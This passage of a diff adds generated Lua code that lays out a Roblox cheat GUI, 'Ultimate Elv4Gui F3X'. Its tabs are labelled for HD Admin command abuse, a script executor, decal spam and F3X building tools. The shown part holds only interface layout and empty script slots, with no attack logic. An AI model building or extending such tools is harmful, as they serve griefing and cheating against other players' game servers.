@@ -1,0 +1,25850 @@
+--[=[
+ d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
+88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
+88      88    88    88            odD'      88      88    88 88ooo88 
+88  ooo 88    88    88          .88'        88      88    88 88~~~88 
+88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
+ Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
+]=]
+
+-- Instances: 788 | Scripts: 285 | Modules: 0 | Tags: 0
+G2L = {};
+
+-- StarterGui.private gui hax
+G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"));
+G2L["1"]["Name"] = [[private gui hax]];
+G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+
+
+-- StarterGui.private gui hax.lol
+G2L["2"] = Instance.new("Frame", G2L["1"]);
+G2L["2"]["Visible"] = false;
+G2L["2"]["BorderSizePixel"] = 3;
+G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2"]["Size"] = UDim2.new(0, 640, 0, 504);
+G2L["2"]["Position"] = UDim2.new(0.21119, 0, 0.01901, 0);
+G2L["2"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2"]["Name"] = [[lol]];
+
+
+-- StarterGui.private gui hax.lol.title
+G2L["3"] = Instance.new("TextLabel", G2L["2"]);
+G2L["3"]["TextWrapped"] = true;
+G2L["3"]["BorderSizePixel"] = 3;
+G2L["3"]["TextSize"] = 14;
+G2L["3"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["3"]["TextScaled"] = true;
+G2L["3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
+G2L["3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["3"]["Size"] = UDim2.new(0, 639, 0, 35);
+G2L["3"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["3"]["Text"] = [[ Ultimate Elv4Gui F3X                                                                    v1.9]];
+G2L["3"]["Name"] = [[title]];
+G2L["3"]["Position"] = UDim2.new(0, 0, 0, 0);
+
+
+-- StarterGui.private gui hax.lol.Home
+G2L["4"] = Instance.new("TextButton", G2L["2"]);
+G2L["4"]["TextWrapped"] = true;
+G2L["4"]["BorderSizePixel"] = 3;
+G2L["4"]["TextSize"] = 14;
+G2L["4"]["TextScaled"] = true;
+G2L["4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["4"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["4"]["Size"] = UDim2.new(0, 70, 0, 35);
+G2L["4"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["4"]["Text"] = [[Home Tab ]];
+G2L["4"]["Name"] = [[Home]];
+G2L["4"]["Position"] = UDim2.new(0.00156, 0, 0.09325, 0);
+
+
+-- StarterGui.private gui hax.lol.Home.LocalScript
+G2L["5"] = Instance.new("LocalScript", G2L["4"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3Xtab
+G2L["6"] = Instance.new("TextButton", G2L["2"]);
+G2L["6"]["TextWrapped"] = true;
+G2L["6"]["BorderSizePixel"] = 3;
+G2L["6"]["TextSize"] = 14;
+G2L["6"]["TextScaled"] = true;
+G2L["6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["6"]["Size"] = UDim2.new(0, 70, 0, 35);
+G2L["6"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["6"]["Text"] = [[F3X / Decals / Scripts Tab]];
+G2L["6"]["Name"] = [[F3Xtab]];
+G2L["6"]["Position"] = UDim2.new(0.10938, 0, 0.09325, 0);
+
+
+-- StarterGui.private gui hax.lol.F3Xtab.LocalScript
+G2L["7"] = Instance.new("LocalScript", G2L["6"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab
+G2L["8"] = Instance.new("TextButton", G2L["2"]);
+G2L["8"]["TextWrapped"] = true;
+G2L["8"]["BorderSizePixel"] = 3;
+G2L["8"]["TextSize"] = 14;
+G2L["8"]["TextScaled"] = true;
+G2L["8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["8"]["Size"] = UDim2.new(0, 67, 0, 35);
+G2L["8"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["8"]["Text"] = [[HD Commands Abuse Tabs]];
+G2L["8"]["Name"] = [[HDA Command Abuse tab]];
+G2L["8"]["Position"] = UDim2.new(0.22344, 0, 0.09325, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab.LocalScript
+G2L["9"] = Instance.new("LocalScript", G2L["8"]);
+
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab
+G2L["a"] = Instance.new("TextButton", G2L["2"]);
+G2L["a"]["TextWrapped"] = true;
+G2L["a"]["BorderSizePixel"] = 3;
+G2L["a"]["TextSize"] = 14;
+G2L["a"]["TextScaled"] = true;
+G2L["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["a"]["Size"] = UDim2.new(0, 67, 0, 35);
+G2L["a"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["a"]["Text"] = [[LocalPlayer Tab]];
+G2L["a"]["Name"] = [[LocalPlayer tab]];
+G2L["a"]["Position"] = UDim2.new(0.32813, 0, 0.09325, 0);
+
+
+-- StarterGui.private gui hax.lol.LocalPlayer tab.LocalScript
+G2L["b"] = Instance.new("LocalScript", G2L["a"]);
+
+
+
+-- StarterGui.private gui hax.lol.Audio tab
+G2L["c"] = Instance.new("TextButton", G2L["2"]);
+G2L["c"]["TextWrapped"] = true;
+G2L["c"]["BorderSizePixel"] = 3;
+G2L["c"]["TextSize"] = 14;
+G2L["c"]["TextScaled"] = true;
+G2L["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["c"]["Size"] = UDim2.new(0, 66, 0, 35);
+G2L["c"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["c"]["Text"] = [[Music Tab]];
+G2L["c"]["Name"] = [[Audio tab]];
+G2L["c"]["Position"] = UDim2.new(0.43281, 0, 0.09325, 0);
+
+
+-- StarterGui.private gui hax.lol.Audio tab.LocalScript
+G2L["d"] = Instance.new("LocalScript", G2L["c"]);
+
+
+
+-- StarterGui.private gui hax.lol.Executor tab
+G2L["e"] = Instance.new("TextButton", G2L["2"]);
+G2L["e"]["TextWrapped"] = true;
+G2L["e"]["BorderSizePixel"] = 3;
+G2L["e"]["TextSize"] = 14;
+G2L["e"]["TextScaled"] = true;
+G2L["e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["e"]["Size"] = UDim2.new(0, 66, 0, 35);
+G2L["e"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["e"]["Text"] = [[Executor Tab]];
+G2L["e"]["Name"] = [[Executor tab]];
+G2L["e"]["Position"] = UDim2.new(0.53594, 0, 0.09325, 0);
+
+
+-- StarterGui.private gui hax.lol.Executor tab.LocalScript
+G2L["f"] = Instance.new("LocalScript", G2L["e"]);
+
+
+
+-- StarterGui.private gui hax.lol.R6
+G2L["10"] = Instance.new("TextButton", G2L["2"]);
+G2L["10"]["TextWrapped"] = true;
+G2L["10"]["BorderSizePixel"] = 3;
+G2L["10"]["TextSize"] = 14;
+G2L["10"]["TextScaled"] = true;
+G2L["10"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["10"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["10"]["Size"] = UDim2.new(0, 59, 0, 35);
+G2L["10"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["10"]["Text"] = [[R6]];
+G2L["10"]["Name"] = [[R6]];
+G2L["10"]["Position"] = UDim2.new(-0.10469, 0, 0, 0);
+
+
+-- StarterGui.private gui hax.lol.R6.LocalScript
+G2L["11"] = Instance.new("LocalScript", G2L["10"]);
+
+
+
+-- StarterGui.private gui hax.lol.RE
+G2L["12"] = Instance.new("TextButton", G2L["2"]);
+G2L["12"]["TextWrapped"] = true;
+G2L["12"]["BorderSizePixel"] = 3;
+G2L["12"]["TextSize"] = 14;
+G2L["12"]["TextScaled"] = true;
+G2L["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["12"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["12"]["Size"] = UDim2.new(0, 59, 0, 35);
+G2L["12"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["12"]["Text"] = [[RE]];
+G2L["12"]["Name"] = [[RE]];
+G2L["12"]["Position"] = UDim2.new(-0.10469, 0, 0.09325, 0);
+
+
+-- StarterGui.private gui hax.lol.RE.LocalScript
+G2L["13"] = Instance.new("LocalScript", G2L["12"]);
+
+
+
+-- StarterGui.private gui hax.lol.Anti-Skids
+G2L["14"] = Instance.new("TextButton", G2L["2"]);
+G2L["14"]["TextWrapped"] = true;
+G2L["14"]["BorderSizePixel"] = 3;
+G2L["14"]["TextSize"] = 14;
+G2L["14"]["TextScaled"] = true;
+G2L["14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["14"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["14"]["Size"] = UDim2.new(0, 59, 0, 35);
+G2L["14"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["14"]["Text"] = [[Anti-Skids]];
+G2L["14"]["Name"] = [[Anti-Skids]];
+G2L["14"]["Position"] = UDim2.new(1.0125, 0, 0.1627, 0);
+
+
+-- StarterGui.private gui hax.lol.Anti-Skids.LocalScript
+G2L["15"] = Instance.new("LocalScript", G2L["14"]);
+
+
+
+-- StarterGui.private gui hax.lol.Stop Audios
+G2L["16"] = Instance.new("TextButton", G2L["2"]);
+G2L["16"]["TextWrapped"] = true;
+G2L["16"]["BorderSizePixel"] = 3;
+G2L["16"]["TextSize"] = 14;
+G2L["16"]["TextScaled"] = true;
+G2L["16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["16"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["16"]["Size"] = UDim2.new(0, 59, 0, 35);
+G2L["16"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["16"]["Text"] = [[Stop Audios]];
+G2L["16"]["Name"] = [[Stop Audios]];
+G2L["16"]["Position"] = UDim2.new(1.0125, 0, 0.06944, 0);
+
+
+-- StarterGui.private gui hax.lol.Stop Audios.LocalScript
+G2L["17"] = Instance.new("LocalScript", G2L["16"]);
+
+
+
+-- StarterGui.private gui hax.lol.HomePage
+G2L["18"] = Instance.new("Frame", G2L["2"]);
+G2L["18"]["BorderSizePixel"] = 3;
+G2L["18"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["18"]["Size"] = UDim2.new(0, 639, 0, 413);
+G2L["18"]["Position"] = UDim2.new(0.00156, 0, 0.18056, 0);
+G2L["18"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["18"]["Name"] = [[HomePage]];
+
+
+-- StarterGui.private gui hax.lol.HomePage.TextLabel
+G2L["19"] = Instance.new("TextLabel", G2L["18"]);
+G2L["19"]["TextWrapped"] = true;
+G2L["19"]["BorderSizePixel"] = 0;
+G2L["19"]["TextSize"] = 14;
+G2L["19"]["TextScaled"] = true;
+G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["19"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["19"]["BackgroundTransparency"] = 1;
+G2L["19"]["Size"] = UDim2.new(0, 391, 0, 46);
+G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["19"]["Text"] = [[Welcome to Elv4r0x's V1.9 Gui]];
+G2L["19"]["Position"] = UDim2.new(0.20814, 0, 0, 0);
+
+
+-- StarterGui.private gui hax.lol.HomePage.username
+G2L["1a"] = Instance.new("TextLabel", G2L["18"]);
+G2L["1a"]["TextWrapped"] = true;
+G2L["1a"]["BorderSizePixel"] = 0;
+G2L["1a"]["TextSize"] = 14;
+G2L["1a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["1a"]["TextScaled"] = true;
+G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["1a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1a"]["BackgroundTransparency"] = 1;
+G2L["1a"]["Size"] = UDim2.new(0, 349, 0, 28);
+G2L["1a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1a"]["Text"] = [[Welcome,]];
+G2L["1a"]["Name"] = [[username]];
+G2L["1a"]["Position"] = UDim2.new(0.01095, 0, 0.30508, 0);
+
+
+-- StarterGui.private gui hax.lol.HomePage.username.LocalScript
+G2L["1b"] = Instance.new("LocalScript", G2L["1a"]);
+
+
+
+-- StarterGui.private gui hax.lol.HomePage.epikface
+G2L["1c"] = Instance.new("ImageLabel", G2L["18"]);
+G2L["1c"]["BorderSizePixel"] = 0;
+G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1c"]["Image"] = [[rbxassetid://56369539]];
+G2L["1c"]["Size"] = UDim2.new(0, 59, 0, 57);
+G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1c"]["BackgroundTransparency"] = 1;
+G2L["1c"]["Name"] = [[epikface]];
+G2L["1c"]["Position"] = UDim2.new(0.90767, 0, 0.86199, 0);
+
+
+-- StarterGui.private gui hax.lol.HomePage.TextLabel
+G2L["1d"] = Instance.new("TextLabel", G2L["18"]);
+G2L["1d"]["TextWrapped"] = true;
+G2L["1d"]["BorderSizePixel"] = 0;
+G2L["1d"]["TextSize"] = 14;
+G2L["1d"]["TextScaled"] = true;
+G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["1d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1d"]["BackgroundTransparency"] = 1;
+G2L["1d"]["Size"] = UDim2.new(0, 241, 0, 23);
+G2L["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1d"]["Text"] = [[UI Made By: @Elv4r0x]];
+G2L["1d"]["Position"] = UDim2.new(0.31142, 0, 0.11138, 0);
+
+
+-- StarterGui.private gui hax.lol.HomePage.fuckingyeah
+G2L["1e"] = Instance.new("ImageLabel", G2L["18"]);
+G2L["1e"]["BorderSizePixel"] = 0;
+G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1e"]["Image"] = [[rbxasset://textures/ui/GuiImagePlaceholder.png]];
+G2L["1e"]["Size"] = UDim2.new(0, 89, 0, 88);
+G2L["1e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
+G2L["1e"]["BackgroundTransparency"] = 1;
+G2L["1e"]["Name"] = [[fuckingyeah]];
+G2L["1e"]["Position"] = UDim2.new(0.01097, 0, 0.76057, 0);
+
+
+-- StarterGui.private gui hax.lol.HomePage.fuckingyeah.UICorner
+G2L["1f"] = Instance.new("UICorner", G2L["1e"]);
+G2L["1f"]["CornerRadius"] = UDim.new(1, 0);
+
+
+-- StarterGui.private gui hax.lol.HomePage.fuckingyeah.LocalScript
+G2L["20"] = Instance.new("LocalScript", G2L["1e"]);
+
+
+
+-- StarterGui.private gui hax.lol.HomePage.fuckingyeah.UIStroke
+G2L["21"] = Instance.new("UIStroke", G2L["1e"]);
+G2L["21"]["Thickness"] = 3;
+G2L["21"]["Color"] = Color3.fromRGB(165, 168, 0);
+
+
+-- StarterGui.private gui hax.lol.HomePage.TextLabel
+G2L["22"] = Instance.new("TextLabel", G2L["18"]);
+G2L["22"]["TextWrapped"] = true;
+G2L["22"]["BorderSizePixel"] = 0;
+G2L["22"]["TextSize"] = 14;
+G2L["22"]["TextScaled"] = true;
+G2L["22"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["22"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["22"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["22"]["BackgroundTransparency"] = 1;
+G2L["22"]["Size"] = UDim2.new(0, 275, 0, 24);
+G2L["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["22"]["Text"] = [[hello there u seem like a cool person]];
+G2L["22"]["Position"] = UDim2.new(0.2989, 0, 0.94189, 0);
+
+
+-- StarterGui.private gui hax.lol.HomePage.TextLabel
+G2L["23"] = Instance.new("TextLabel", G2L["18"]);
+G2L["23"]["TextWrapped"] = true;
+G2L["23"]["BorderSizePixel"] = 0;
+G2L["23"]["TextSize"] = 14;
+G2L["23"]["TextScaled"] = true;
+G2L["23"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["23"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["23"]["BackgroundTransparency"] = 1;
+G2L["23"]["Size"] = UDim2.new(0, 258, 0, 16);
+G2L["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["23"]["Text"] = [[(This is The Final version of Elv4 Gui)]];
+G2L["23"]["Position"] = UDim2.new(0.29577, 0, 0.17433, 0);
+
+
+-- StarterGui.private gui hax.lol.HomePage.thing
+G2L["24"] = Instance.new("TextLabel", G2L["18"]);
+G2L["24"]["TextWrapped"] = true;
+G2L["24"]["BorderSizePixel"] = 0;
+G2L["24"]["TextSize"] = 14;
+G2L["24"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["24"]["TextScaled"] = true;
+G2L["24"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["24"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["24"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["24"]["BackgroundTransparency"] = 1;
+G2L["24"]["Size"] = UDim2.new(0, 300, 0, 21);
+G2L["24"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["24"]["Text"] = [[HD Admin:]];
+G2L["24"]["Name"] = [[thing]];
+G2L["24"]["Position"] = UDim2.new(0.01095, 0, 0.43826, 0);
+
+
+-- StarterGui.private gui hax.lol.HomePage.thing.LocalScript
+G2L["25"] = Instance.new("LocalScript", G2L["24"]);
+
+
+
+-- StarterGui.private gui hax.lol.HomePage.thing
+G2L["26"] = Instance.new("TextLabel", G2L["18"]);
+G2L["26"]["TextWrapped"] = true;
+G2L["26"]["BorderSizePixel"] = 0;
+G2L["26"]["TextSize"] = 14;
+G2L["26"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["26"]["TextScaled"] = true;
+G2L["26"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["26"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["26"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["26"]["BackgroundTransparency"] = 1;
+G2L["26"]["Size"] = UDim2.new(0, 343, 0, 21);
+G2L["26"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["26"]["Text"] = [[F3X/Btools:]];
+G2L["26"]["Name"] = [[thing]];
+G2L["26"]["Position"] = UDim2.new(0.01095, 0, 0.50363, 0);
+
+
+-- StarterGui.private gui hax.lol.HomePage.thing.LocalScript
+G2L["27"] = Instance.new("LocalScript", G2L["26"]);
+
+
+
+-- StarterGui.private gui hax.lol.HomePage.thing
+G2L["28"] = Instance.new("TextLabel", G2L["18"]);
+G2L["28"]["TextWrapped"] = true;
+G2L["28"]["BorderSizePixel"] = 0;
+G2L["28"]["TextSize"] = 14;
+G2L["28"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["28"]["TextScaled"] = true;
+G2L["28"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["28"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["28"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["28"]["BackgroundTransparency"] = 1;
+G2L["28"]["Size"] = UDim2.new(0, 358, 0, 23);
+G2L["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["28"]["Text"] = [[have fun ig]];
+G2L["28"]["Name"] = [[thing]];
+G2L["28"]["Position"] = UDim2.new(0.01095, 0, 0.61259, 0);
+
+
+-- StarterGui.private gui hax.lol.HomePage.pagelabel
+G2L["29"] = Instance.new("ImageLabel", G2L["18"]);
+G2L["29"]["BorderSizePixel"] = 0;
+G2L["29"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["29"]["Image"] = [[rbxassetid://116205546732452]];
+G2L["29"]["Size"] = UDim2.new(0, 103, 0, 96);
+G2L["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["29"]["BackgroundTransparency"] = 1;
+G2L["29"]["Name"] = [[pagelabel]];
+G2L["29"]["Position"] = UDim2.new(-0.02504, 0, 0, 0);
+
+
+-- StarterGui.private gui hax.lol.HomePage.TextLabel
+G2L["2a"] = Instance.new("TextLabel", G2L["18"]);
+G2L["2a"]["TextWrapped"] = true;
+G2L["2a"]["BorderSizePixel"] = 2;
+G2L["2a"]["TextSize"] = 20;
+G2L["2a"]["TextScaled"] = true;
+G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["2a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2a"]["Size"] = UDim2.new(0, 248, 0, 150);
+G2L["2a"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2a"]["Text"] = [[Huge thanks to @cZerkidd @Picklelover @snakeGod AKA zGkidd @InnocentPlayer @wQs and other else that helped me with this gui ig]];
+G2L["2a"]["Position"] = UDim2.new(0.59311, 0, 0.30508, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage
+G2L["2b"] = Instance.new("Frame", G2L["2"]);
+G2L["2b"]["Visible"] = false;
+G2L["2b"]["BorderSizePixel"] = 3;
+G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2b"]["Size"] = UDim2.new(0, 639, 0, 413);
+G2L["2b"]["Position"] = UDim2.new(0, 0, 0.18056, 0);
+G2L["2b"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2b"]["Name"] = [[F3XtabPage]];
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame
+G2L["2c"] = Instance.new("ScrollingFrame", G2L["2b"]);
+G2L["2c"]["Active"] = true;
+G2L["2c"]["BorderSizePixel"] = 3;
+G2L["2c"]["CanvasSize"] = UDim2.new(0, 0, 5, 0);
+G2L["2c"]["Name"] = [[ScrollFrame]];
+G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2c"]["Size"] = UDim2.new(0, 639, 0, 413);
+G2L["2c"]["Position"] = UDim2.new(0.00156, 0, 0, 0);
+G2L["2c"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2c"]["ScrollBarThickness"] = 7;
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set SkyBox
+G2L["2d"] = Instance.new("TextButton", G2L["2c"]);
+G2L["2d"]["TextWrapped"] = true;
+G2L["2d"]["BorderSizePixel"] = 3;
+G2L["2d"]["TextSize"] = 14;
+G2L["2d"]["TextScaled"] = true;
+G2L["2d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2d"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2d"]["Size"] = UDim2.new(0, 52, 0, 34);
+G2L["2d"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2d"]["Text"] = [[Set Skybox]];
+G2L["2d"]["Name"] = [[Set SkyBox]];
+G2L["2d"]["Position"] = UDim2.new(0.01408, 0, 0.00367, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set SkyBox.LocalScript
+G2L["2e"] = Instance.new("LocalScript", G2L["2d"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set Decal Spam
+G2L["2f"] = Instance.new("TextButton", G2L["2c"]);
+G2L["2f"]["TextWrapped"] = true;
+G2L["2f"]["BorderSizePixel"] = 3;
+G2L["2f"]["TextSize"] = 14;
+G2L["2f"]["TextScaled"] = true;
+G2L["2f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2f"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["2f"]["Size"] = UDim2.new(0, 53, 0, 34);
+G2L["2f"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["2f"]["Text"] = [[Set Decal Spam]];
+G2L["2f"]["Name"] = [[Set Decal Spam]];
+G2L["2f"]["Position"] = UDim2.new(0.01252, 0, 0.02497, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set Decal Spam.LocalScript
+G2L["30"] = Instance.new("LocalScript", G2L["2f"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.TextBoxDecal
+G2L["31"] = Instance.new("TextBox", G2L["2c"]);
+G2L["31"]["Name"] = [[TextBoxDecal]];
+G2L["31"]["BorderSizePixel"] = 3;
+G2L["31"]["TextWrapped"] = true;
+G2L["31"]["TextSize"] = 20;
+G2L["31"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["31"]["TextScaled"] = true;
+G2L["31"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
+G2L["31"]["ClearTextOnFocus"] = false;
+G2L["31"]["PlaceholderText"] = [[-- Put Decal ID]];
+G2L["31"]["Size"] = UDim2.new(0, 127, 0, 19);
+G2L["31"]["Position"] = UDim2.new(0.35681, 0, 0.03874, 0);
+G2L["31"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["31"]["Text"] = [[]];
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Set Colorful SkyBox
+G2L["32"] = Instance.new("TextButton", G2L["2c"]);
+G2L["32"]["TextWrapped"] = true;
+G2L["32"]["BorderSizePixel"] = 3;
+G2L["32"]["TextSize"] = 14;
+G2L["32"]["TextScaled"] = true;
